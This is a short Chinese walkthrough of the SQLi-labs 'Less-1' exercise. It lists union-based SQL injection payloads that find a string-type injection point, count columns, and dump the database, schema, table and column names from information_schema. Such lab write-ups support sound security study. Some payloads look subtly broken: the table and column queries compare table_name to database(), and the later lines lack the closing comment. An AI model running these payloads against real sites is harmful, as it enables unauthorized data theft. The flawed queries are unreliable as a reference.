Less-1#

传入id=1，页面正常回显，传入id=1'页面报错。分别传参id=1' and 1=1和id=1' and 1=2，页面回显正常，判断为字符型注入。

接下来使用联合查询看看有几列数据:id=-1'union select 1,2,3--+，这是两条语句，先让前面为-1为假，执行后面的联合查询语句，测试有几列数据，测试出来有3列数据，其中第2、3位为显示位，可进行联合查询注入。

查看当前数据库名:id=-1'union select 1,database(),3--+

爆库名:id=-1'union select 1,database(),group_concat(schema_name) from information_schema.schemata

爆表名:id=-1'union select 1,database(),group_concat(table_name) from information_schema.tables where table_name=database()

爆字段:id=-1'union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=database()
